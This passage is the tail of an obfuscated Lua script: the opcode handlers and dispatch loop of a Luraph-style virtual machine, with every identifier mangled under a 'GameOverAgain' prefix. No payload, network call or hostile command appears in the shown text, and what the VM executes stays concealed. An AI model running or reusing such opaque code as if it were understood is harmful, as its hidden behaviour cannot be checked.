GameOverAgainIIllIiI1IIIl11iii1i} end end end end end GameOverAgainl1l11l11Ili1i11iiII[23] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii, GameOverAgainlIlli11li11iIilIilII1, GameOverAgainiIlIIiiiI11l11iI11i) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 if GameOverAgainII1I1Iil11l1IiIIilI > 255 then GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainII1I1Iil11l1IiIIilI - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end if GameOverAgainIiliilIi1lIl11l1lil > 255 then GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainIiliilIi1lIl11l1lil - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIiliilIi1lIl11l1lil] end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainII1I1Iil11l1IiIIilI - GameOverAgainIiliilIi1lIl11l1lil end GameOverAgainl1l11l11Ili1i11iiII[25] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii) local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] if GameOverAgainIiliilIi1lIl11l1lil > 255 then GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainIiliilIi1lIl11l1lil - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIiliilIi1lIl11l1lil] end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI][GameOverAgainIiliilIi1lIl11l1lil] end GameOverAgainl1l11l11Ili1i11iiII[12] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii, GameOverAgainlIlli11li11iIilIilII1) local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = { GameOverAgaini1I1II1il1l1iI1lli1(GameOverAgainiIII1lllliIil1IlII1, 1, GameOverAgainII1I1Iil11l1IiIIilI == 0 and 895 or GameOverAgainII1I1Iil11l1IiIIilI) } end GameOverAgainl1l11l11Ili1i11iiII[28] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainl1ll1ll1ilIii1lliIi = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 2] local GameOverAgainlIIi111Ii1liI11llii = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] + GameOverAgainl1ll1ll1ilIii1lliIi GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainlIIi111Ii1liI11llii if GameOverAgainl1ll1ll1ilIii1lliIi > 0 then if GameOverAgainlIIi111Ii1liI11llii <= GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 1] then GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + GameOverAgainIil1l1iiil1IlilIIiI GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 3] = GameOverAgainlIIi111Ii1liI11llii end elseif GameOverAgainlIIi111Ii1liI11llii >= GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 1] then GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + GameOverAgainIil1l1iiil1IlilIIiI GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 3] = GameOverAgainlIIi111Ii1liI11llii end end GameOverAgainl1l11l11Ili1i11iiII[0] = function(GameOverAgainlIlIlIli1i1IiI11il11l) local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainllilli1iIil1l111i11(GameOverAgainlIlliil1Il1l1l1il1IlI(GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli]), "`for` initial value must be a number") GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 1] = GameOverAgainllilli1iIil1l111i11(GameOverAgainlIlliil1Il1l1l1il1IlI(GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 1]), "`for` limit value must be a number") GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 2] = GameOverAgainllilli1iIil1l111i11(GameOverAgainlIlliil1Il1l1l1il1IlI(GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 2]), "`for` step value must be a number") GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] - GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 2] GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + GameOverAgainIil1l1iiil1IlilIIiI end GameOverAgainl1l11l11Ili1i11iiII[29] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 if GameOverAgainII1I1Iil11l1IiIIilI > 255 then GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainII1I1Iil11l1IiIIilI - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end if GameOverAgainIiliilIi1lIl11l1lil > 255 then GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainIiliilIi1lIl11l1lil - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIiliilIi1lIl11l1lil] end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainII1I1Iil11l1IiIIilI + GameOverAgainIiliilIi1lIl11l1lil end GameOverAgainl1l11l11Ili1i11iiII[2] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii) local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + GameOverAgainIil1l1iiil1IlilIIiI end GameOverAgainl1l11l11Ili1i11iiII[18] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainIi1iI1i1lIl1Il1iII1, GameOverAgainIilIl111llIlliiII1l if GameOverAgainII1I1Iil11l1IiIIilI ~= 1 then if GameOverAgainII1I1Iil11l1IiIIilI ~= 0 then GameOverAgainIilIl111llIlliiII1l = GameOverAgainIliillIIiIilllIIIli + GameOverAgainII1I1Iil11l1IiIIilI - 1 else GameOverAgainIilIl111llIlliiII1l = GameOverAgainIlilIill1Il1IliiI1i end GameOverAgainIilIl111llIlliiII1l, GameOverAgainIi1iI1i1lIl1Il1iII1 = GameOverAgainiil1lI111lI11i1lIii(GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli](GameOverAgaini1I1II1il1l1iI1lli1(GameOverAgainIiiilIill1ilIl1ii1i, GameOverAgainIliillIIiIilllIIIli + 1, GameOverAgainIilIl111llIlliiII1l))) else GameOverAgainIilIl111llIlliiII1l, GameOverAgainIi1iI1i1lIl1Il1iII1 = GameOverAgainiil1lI111lI11i1lIii(GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli]()) end GameOverAgainIiiilIill1ilIl1ii1i = GameOverAgainIi1iI1i1lIl1Il1iII1 return true, 1, GameOverAgainIilIl111llIlliiII1l end GameOverAgainl1l11l11Ili1i11iiII[16] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii, GameOverAgainlIlli11li11iIilIilII1) local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainlIllIll1lIIIil1lIIli1][GameOverAgainll1I11iiiiIIIi1llII] end GameOverAgainl1l11l11Ili1i11iiII[21] = function(GameOverAgainlIlIlIli1i1IiI11il11l) local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] if GameOverAgainII1I1Iil11l1IiIIilI > 255 then GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainII1I1Iil11l1IiIIilI - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end if GameOverAgainIiliilIi1lIl11l1lil > 255 then GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainIiliilIi1lIl11l1lil - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIiliilIi1lIl11l1lil] end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainII1I1Iil11l1IiIIilI ^ GameOverAgainIiliilIi1lIl11l1lil end GameOverAgainl1l11l11Ili1i11iiII[15] = function(GameOverAgainlIlIlIli1i1IiI11il11l) local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainlIllliiIlIlI1l1lIllIi = GameOverAgainIli1III1i1l1l1iil11[GameOverAgainlIllIll1lIIIil1lIIli1] local GameOverAgainllili111iiIll1liIi1 = {} local GameOverAgainlIlIIli11ilii1lIl1I1I = GameOverAgainll11Iii11i1Ill1ll1i({}, { __index = function(GameOverAgainlIIIii1i111iilii11l, GameOverAgainlIl1ll1illI1iIlI1i1I1) local GameOverAgainIlIIliIi1Iil111I1II = GameOverAgainllili111iiIll1liIi1[GameOverAgainlIl1ll1illI1iIlI1i1I1] return GameOverAgainIlIIliIi1Iil111I1II[1][GameOverAgainIlIIliIi1Iil111I1II[2]] end, __newindex = function(GameOverAgainlIIIii1i111iilii11l, GameOverAgainlIl1ll1illI1iIlI1i1I1, GameOverAgainiliilIiIi11iiii1lIi) local GameOverAgainIlIIliIi1Iil111I1II = GameOverAgainllili111iiIll1liIi1[GameOverAgainlIl1ll1illI1iIlI1i1I1] GameOverAgainIlIIliIi1Iil111I1II[1][GameOverAgainIlIIliIi1Iil111I1II[2]] = GameOverAgainiliilIiIi11iiii1lIi end }) for GameOverAgainI1lIiii11ll1i1IlI1l = 1, GameOverAgainlIllliiIlIlI1l1lIllIi[GameOverAgainiilllililii11ll1l1i] do local GameOverAgainii11IiIliiii1Ii11Ii = GameOverAgainlIl1llIl1IlIl1lIIIIIl[GameOverAgainiIIl1iliI11i11IlIIi] if GameOverAgainii11IiIliiii1Ii11Ii[GameOverAgainiIliiIlIlI11Ii1I1i1] == GameOverAgainlIlilllilI1I1ll11ilii then GameOverAgainllili111iiIll1liIi1[GameOverAgainI1lIiii11ll1i1IlI1l - 1] = { GameOverAgainIiiilIill1ilIl1ii1i, GameOverAgainii11IiIliiii1Ii11Ii[GameOverAgainii11i1iil1IlIIi1IIi] } elseif GameOverAgainii11IiIliiii1Ii11Ii[GameOverAgainiIliiIlIlI11Ii1I1i1] == GameOverAgainlli1iIIlIlIliiiI1I1 then GameOverAgainllili111iiIll1liIi1[GameOverAgainI1lIiii11ll1i1IlI1l - 1] = { GameOverAgainIlilIiI1Ii11l1Il111, GameOverAgainii11IiIliiii1Ii11Ii[GameOverAgainii11i1iil1IlIIi1IIi] } end GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + 1 end if GameOverAgainlIllliiIlIlI1l1lIllIi[GameOverAgainiilllililii11ll1l1i] > 0 then GameOverAgainllIil1l11IIlI1lll1i[#GameOverAgainllIil1l11IIlI1lll1i + 1] = GameOverAgainllili111iiIll1liIi1 end local GameOverAgainlii1i1i1Ii1l1Ilill1 = GameOverAgainlIl1l11iill1Ii1I1I1i1(GameOverAgainlIllliiIlIlI1l1lIllIi, GameOverAgainilIllIIIiilIll1Iii1, GameOverAgainlIlIIli11ilii1lIl1I1I) GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainlii1i1i1Ii1l1Ilill1 end GameOverAgainl1l11l11Ili1i11iiII[5] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii) local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] if GameOverAgainII1I1Iil11l1IiIIilI > 255 then GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainII1I1Iil11l1IiIIilI - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end if GameOverAgainIiliilIi1lIl11l1lil > 255 then GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainIiliilIi1lIl11l1lil - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIiliilIi1lIl11l1lil] end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli][GameOverAgainII1I1Iil11l1IiIIilI] = GameOverAgainIiliilIi1lIl11l1lil end GameOverAgainl1l11l11Ili1i11iiII[27] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainl1ilil1iI1lli11i1l1 = (GameOverAgainIiliilIi1lIl11l1lil - 1) * 50 if GameOverAgainII1I1Iil11l1IiIIilI == 0 then GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIlilIill1Il1IliiI1i - GameOverAgainIliillIIiIilllIIIli end for GameOverAgainI1lIiii11ll1i1IlI1l = 1, GameOverAgainII1I1Iil11l1IiIIilI do GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli][GameOverAgainl1ilil1iI1lli11i1l1 + GameOverAgainI1lIiii11ll1i1IlI1l] = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + GameOverAgainI1lIiii11ll1i1IlI1l] end end GameOverAgainl1l11l11Ili1i11iiII[14] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii) local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end GameOverAgainl1l11l11Ili1i11iiII[20] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainl1iii11Iill11l1IIIi = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] for GameOverAgainI1lIiii11ll1i1IlI1l = GameOverAgainII1I1Iil11l1IiIIilI + 1, GameOverAgainIiliilIi1lIl11l1lil do GameOverAgainl1iii11Iill11l1IIIi = GameOverAgainl1iii11Iill11l1IIIi .. GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainI1lIiii11ll1i1IlI1l] end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainl1iii11Iill11l1IIIi end GameOverAgainiIlliIliiIlllIi1Il1 = { GameOverAgainl1l11l11Ili1i11iiII[9], GameOverAgainl1l11l11Ili1i11iiII[29], GameOverAgainl1l11l11Ili1i11iiII[4], GameOverAgainl1l11l11Ili1i11iiII[27], GameOverAgainl1l11l11Ili1i11iiII[18], GameOverAgainl1l11l11Ili1i11iiII[3], GameOverAgainl1l11l11Ili1i11iiII[17], GameOverAgainl1l11l11Ili1i11iiII[5], GameOverAgainl1l11l11Ili1i11iiII[32], GameOverAgainl1l11l11Ili1i11iiII[23], GameOverAgainl1l11l11Ili1i11iiII[21], GameOverAgainl1l11l11Ili1i11iiII[8], GameOverAgainl1l11l11Ili1i11iiII[1], GameOverAgainl1l11l11Ili1i11iiII[12], GameOverAgainl1l11l11Ili1i11iiII[31], GameOverAgainl1l11l11Ili1i11iiII[0], GameOverAgainl1l11l11Ili1i11iiII[13], GameOverAgainl1l11l11Ili1i11iiII[10], GameOverAgainl1l11l11Ili1i11iiII[7], GameOverAgainl1l11l11Ili1i11iiII[30], GameOverAgainl1l11l11Ili1i11iiII[26], GameOverAgainl1l11l11Ili1i11iiII[20], GameOverAgainl1l11l11Ili1i11iiII[15], GameOverAgainl1l11l11Ili1i11iiII[33], GameOverAgainl1l11l11Ili1i11iiII[25], GameOverAgainl1l11l11Ili1i11iiII[11], GameOverAgainl1l11l11Ili1i11iiII[34], GameOverAgainl1l11l11Ili1i11iiII[6], GameOverAgainl1l11l11Ili1i11iiII[28], GameOverAgainl1l11l11Ili1i11iiII[19], GameOverAgainl1l11l11Ili1i11iiII[14], GameOverAgainl1l11l11Ili1i11iiII[24], GameOverAgainl1l11l11Ili1i11iiII[2], GameOverAgainl1l11l11Ili1i11iiII[22], GameOverAgainl1l11l11Ili1i11iiII[16] } local function GameOverAgainliliiIIiliII1i1I1iI() while true do local GameOverAgainlIlIlIli1i1IiI11il11l = GameOverAgainlIl1llIl1IlIl1lIIIIIl[GameOverAgainiIIl1iliI11i11IlIIi] GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + 1 local GameOverAgainil1iIliilllIii11Iil, GameOverAgaini1liiiiIililIIIIlI1, GameOverAgainIii1I1iiiIllIi1i1lI = GameOverAgainiIlliIliiIlllIi1Il1[GameOverAgainlIlIlIli1i1IiI11il11l[91286] + 1](GameOverAgainlIlIlIli1i1IiI11il11l) if GameOverAgainil1iIliilllIii11Iil then return GameOverAgaini1liiiiIililIIIIlI1, GameOverAgainIii1I1iiiIllIi1i1lI end end end local GameOverAgainlIlII11i1ili1Iilli11i, GameOverAgaini1liiiiIililIIIIlI1, GameOverAgainIii1I1iiiIllIi1i1lI = GameOverAgainI1i1i1i1lli1ilIII1l(GameOverAgainliliiIIiliII1i1I1iI) if GameOverAgainlIlII11i1ili1Iilli11i then if GameOverAgaini1liiiiIililIIIIlI1 then return GameOverAgaini1I1II1il1l1iI1lli1(GameOverAgainIiiilIill1ilIl1ii1i, GameOverAgaini1liiiiIililIIIIlI1, GameOverAgainIii1I1iiiIllIi1i1lI) end else local GameOverAgainlIlIl1IiIiIIlll1IiIli = GameOverAgainlI1il11IliI1i1ii1ll("Luraph Script:" .. (GameOverAgainlIlil11I11iI11lI1IiiI[GameOverAgainiIIl1iliI11i11IlIIi - 1] or "") .. ": " .. GameOverAgainlIlilllIilIIiIIlIilIl(GameOverAgaini1liiiiIililIIIIlI1), "[^:]+:%d*: ", function(GameOverAgainIl11IIlI1llI11llIil) if not GameOverAgainlIIii1II11llI1I1III(GameOverAgainIl11IIlI1llI11llIil, "Luraph Script:%d") then return "" end end) GameOverAgainl1I1iI11iII1lilliiI(GameOverAgainlIlIl1IiIiIIlll1IiIli, 0) end end GameOverAgainiiilI1ii1i11l11Ilil(GameOverAgainIiI111ilill11I1IiI1, GameOverAgainilIllIIIiilIll1Iii1) return GameOverAgainIiI111ilill11I1IiI1 end local GameOverAgainlIliiIIIiIiiIlIil1i1I = GameOverAgainiIiilIliiIlilliliIi() return GameOverAgainlIl1l11iill1Ii1I1I1i1(GameOverAgainlIliiIIIiIiiIlIil1i1I, GameOverAgainilIllIIIiilIll1Iii1)() end 